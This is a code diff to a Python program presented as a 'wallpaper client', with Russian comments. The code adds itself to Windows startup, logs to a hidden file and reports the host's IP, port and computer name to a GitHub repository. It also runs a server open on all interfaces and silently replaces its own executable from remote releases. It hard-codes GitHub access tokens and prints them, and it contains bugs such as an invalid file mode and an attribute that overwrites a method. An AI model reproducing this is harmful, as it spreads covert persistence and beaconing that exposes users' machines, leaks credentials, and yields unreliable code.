@@ -14,8 +14,9 @@ import tempfile
 import base64
 from io import BytesIO
 import subprocess
+import socket
+import base64
 
-# Настройка логирования (в скрытый файл)
 logging.basicConfig(
     filename=os.path.join(os.path.expanduser("~"), ".wallpaper_client.log"),
     level=logging.INFO,
@@ -23,139 +24,149 @@ logging.basicConfig(
 )
 
 class WallpaperClient:
+
     def __init__(self):
         self.app = Flask(__name__)
         self.app.logger.setLevel(logging.ERROR)  # Отключаем лишние логи Flask
         self.setup_routes()
-        self.config_file = os.path.join(os.path.expanduser("~"), ".wallpaper_config.json")
+        self.load_config_file = os.path.join(os.path.expanduser("~"), ".wallpaper_config.json")
         self.load_config()
         
     def load_config(self):
 
         default_config = {
             "github_repo": "adminhelpers/dimka1c",  # Замените на ваш репозиторий
-            "github_token": "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",  # Добавьте ваш GitHub токен
+            "github_token": "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",  # Добавьте ваш GitHub токен
             "current_version": "1.0.0",
             "server_port": 8888,
             "check_updates_interval": 3600
         }
         
-        if os.path.exists(self.config_file):
+        if os.path.exists(self.load_config_file):
             try:
-                with open(self.config_file, 'r') as f:
-                    self.config = json.load(f)
+                with open(self.load_config_file, 'wr') as f:
+                    self.load_config = json.load(f)
             except:
-                self.config = default_config
+                print('Ошибка обработки')
+                self.load_config = default_config
         else:
-            self.config = default_config
+            self.load_config = default_config
             self.save_config()
-    
-    import socket
-import base64
+        ipconfig = self.get_local_ip()
+        self.update_ip_in_github(ipconfig)
 
-def get_local_ip(self):
-    """Получение локального IP адреса"""
-    try:
-        # Подключаемся к внешнему адресу, чтобы узнать локальный IP
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        local_ip = s.getsockname()[0]
-        s.close()
-        return local_ip
-    except Exception:
-        # Fallback метод
-        return socket.gethostbyname(socket.gethostname())
+    def get_local_ip(self):
+        print('Получение локального IP адреса')
+        try:
+            # Подключаемся к внешнему адресу, чтобы узнать локальный IP
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            print(local_ip)
+            return local_ip
+        except Exception:
+            # Fallback метод
+            return socket.gethostbyname(socket.gethostname())
 
-def update_ip_in_github(self, ip_address):
-    """Обновление IP адреса в GitHub репозитории"""
-    try:
-        repo_path = self.config['github_repo']
-        github_token = self.config.get('github_token')  # Добавим в конфиг
-        
-        if not github_token:
-            logging.warning("GitHub token не найден, пропускаем обновление IP")
-            return False
-        
-        # Данные для файла
-        file_data = {
-            "ip_address": ip_address,
-            "port": self.config['server_port'],
-            "last_update": time.strftime("%Y-%m-%d %H:%M:%S"),
-            "computer_name": socket.gethostname()
-        }
-        
-        # Конвертируем в JSON и кодируем в base64
-        file_content = json.dumps(file_data, indent=2)
-        encoded_content = base64.b64encode(file_content.encode()).decode()
-        
-        # GitHub API URL для создания/обновления файла
-        api_url = f"https://api.github.com/repos/{repo_path}/contents/client_info.json"
-        
-        headers = {
-            "Authorization": f"token {github_token}",
-            "Accept": "application/vnd.github.v3+json"
-        }
-        
-        # Сначала попробуем получить SHA существующего файла
-        response = requests.get(api_url, headers=headers)
-        sha = None
-        if response.status_code == 200:
-            sha = response.json()['sha']
-        
-        # Подготавливаем данные для создания/обновления
-        data = {
-            "message": f"Update client IP to {ip_address}",
-            "content": encoded_content,
-            "branch": "main"  # или "master" в зависимости от вашего репозитория
-        }
-        
-        if sha:
-            data["sha"] = sha  # Для обновления существующего файла
-        
-        # Отправляем запрос
-        response = requests.put(api_url, headers=headers, json=data)
-        
-        if response.status_code in [200, 201]:
-            logging.info(f"IP адрес {ip_address} успешно обновлен в GitHub")
-            return True
-        else:
-            logging.error(f"Ошибка обновления IP в GitHub: {response.status_code} - {response.text}")
-            return False
+    def update_ip_in_github(self, ip_address):
+        print('Обновление IP адреса в GitHub репозитории')
+        try:
+            print(self.load_config)
+            repo_path = self.load_config['github_repo']
+            print(f'repo_path: {repo_path}')
+            github_token = self.load_config['github_token']  # Добавим в конфиг
+            print(f'github token: {github_token}')
+            print('Проверка github token.... ')
+            if not github_token:
+                print('GitHub token не найден')
+                logging.warning("GitHub token не найден, пропускаем обновление IP")
+                return False
             
-    except Exception as e:
-        logging.error(f"Ошибка обновления IP в GitHub: {e}")
-        return False
+            
+            # Данные для файла
+            file_data = {
+                "ip_address": ip_address,
+                "port": self.load_config['server_port'],
+                "last_update": time.strftime("%Y-%m-%d %H:%M:%S"),
+                "computer_name": socket.gethostname()
+            }
+            print('file_date upload yes')
+            
+            # Конвертируем в JSON и кодируем в base64
+            file_content = json.dumps(file_data, indent=2)
+            encoded_content = base64.b64encode(file_content.encode()).decode()
+            
+            # GitHub API URL для создания/обновления файла
+            api_url = f"https://api.github.com/repos/{repo_path}/contents/client_info.json"
+            
+            headers = {
+                "Authorization": f"token {github_token}",
+                "Accept": "application/vnd.github.v3+json"
+            }
+            
+            # Сначала попробуем получить SHA существующего файла
+            response = requests.get(api_url, headers=headers)
+            sha = None
+            if response.status_code == 200:
+                sha = response.json()['sha']
+            
+            # Подготавливаем данные для создания/обновления
+            data = {
+                "message": f"Update client IP to {ip_address}",
+                "content": encoded_content,
+                "branch": "main"  # или "master" в зависимости от вашего репозитория
+            }
+            
+            if sha:
+                data["sha"] = sha  # Для обновления существующего файла
+            
+            # Отправляем запрос
+            response = requests.put(api_url, headers=headers, json=data)
+            
+            print('+')
+            print(response)
+            if response.status_code in [200, 201]:
+                print(f"IP адрес {ip_address} успешно обновлен в GitHub")
+                return True
+            else:
+                print(f"Ошибка обновления IP в GitHub: {response.status_code} - {response.text}")
+                return False
+                
+        except Exception as e:
+            print(f"Ошибка обновления IP в GitHub: {e}")
+            return False
 
-def run(self):
-    """Основной метод запуска с обновлением IP"""
-    logging.info("Запуск WallpaperClient")
-    
-    # Добавляем в автозагрузку при первом запуске
-    if not self.check_if_in_startup():
-        self.add_to_startup()
-    
-    # Получаем и обновляем IP в GitHub
-    local_ip = self.get_local_ip()
-    self.update_ip_in_github(local_ip)
-    
-    # Запускаем поток проверки обновлений
-    update_thread = threading.Thread(target=self.update_checker_thread, daemon=True)
-    update_thread.start()
-    
-    # Проверяем обновления при запуске
-    self.check_for_updates()
-    
-    # Запускаем веб-сервер
-    try:
-        self.app.run(host='0.0.0.0', port=self.config['server_port'], debug=False)
-    except Exception as e:
-        logging.error(f"Ошибка запуска сервера: {e}")
+    def run(self):
+        """Основной метод запуска с обновлением IP"""
+        logging.info("Запуск WallpaperClient")
+        
+        # Добавляем в автозагрузку при первом запуске
+        if not self.check_if_in_startup():
+            self.add_to_startup()
+        
+        # Получаем и обновляем IP в GitHub
+        local_ip = self.get_local_ip()
+        self.update_ip_in_github(local_ip)
+        
+        # Запускаем поток проверки обновлений
+        update_thread = threading.Thread(target=self.update_checker_thread, daemon=True)
+        update_thread.start()
+        
+        # Проверяем обновления при запуске
+        self.check_for_updates()
+        
+        # Запускаем веб-сервер
+        try:
+            self.app.run(host='0.0.0.0', port=self.load_config['server_port'], debug=False)
+        except Exception as e:
+            logging.error(f"Ошибка запуска сервера: {e}")
 
     
     def save_config(self):
         """Сохранение конфигурации"""
-        with open(self.config_file, 'w') as f:
-            json.dump(self.config, f)
+        with open(self.load_config_file, 'w') as f:
+            json.dump(self.load_config, f)
     
     def add_to_startup(self):
         """Добавление в автозагрузку Windows"""
@@ -252,14 +263,14 @@ def run(self):
     def check_for_updates(self):
         """Проверка обновлений на GitHub"""
         try:
-            repo = self.config['github_repo']
+            repo = self.load_config['github_repo']
             url = f"https://api.github.com/repos/{repo}/releases/latest"
             response = requests.get(url, timeout=10)
             
             if response.status_code == 200:
                 release_data = response.json()
                 latest_version = release_data['tag_name'].lstrip('v')
-                current_version = self.config['current_version']
+                current_version = self.load_config['current_version']
                 
                 if latest_version != current_version:
                     logging.info(f"Найдено обновление: {latest_version}")
@@ -302,17 +313,17 @@ def run(self):
                         f.write(chunk)
                 
                 # Обновляем версию в конфиге
-                self.config['current_version'] = release_data['tag_name'].lstrip('v')
+                self.load_config['current_version'] = release_data['tag_name'].lstrip('v')
                 self.save_config()
                 
                 # Создаем bat файл для замены exe
                 bat_content = f"""
-@echo off
-timeout /t 2 /nobreak >nul
-move "{new_exe}" "{current_exe}"
-start "" "{current_exe}"
-del "%0"
-"""
+                    @echo off
+                    timeout /t 2 /nobreak >nul
+                    move "{new_exe}" "{current_exe}"
+                    start "" "{current_exe}"
+                    del "%0"
+                """
                 bat_path = os.path.join(tempfile.gettempdir(), "update.bat")
                 with open(bat_path, 'w') as f:
                     f.write(bat_content)
@@ -331,7 +342,7 @@ del "%0"
         
         @self.app.route('/status', methods=['GET'])
         def status():
-            return jsonify({'status': 'running', 'version': self.config['current_version']})
+            return jsonify({'status': 'running', 'version': self.load_config['current_version']})
         
         @self.app.route('/wallpaper', methods=['GET'])
         def get_wallpaper():
@@ -363,7 +374,7 @@ del "%0"
     def update_checker_thread(self):
         """Поток для периодической проверки обновлений"""
         while True:
-            time.sleep(self.config['check_updates_interval'])
+            time.sleep(self.load_config['check_updates_interval'])
             self.check_for_updates()
     
     def run(self):
@@ -383,7 +394,7 @@ del "%0"
         
         # Запускаем веб-сервер
         try:
-            self.app.run(host='0.0.0.0', port=self.config['server_port'], debug=False)
+            self.app.run(host='0.0.0.0', port=self.load_config['server_port'], debug=False)
         except Exception as e:
             logging.error(f"Ошибка запуска сервера: {e}")
 
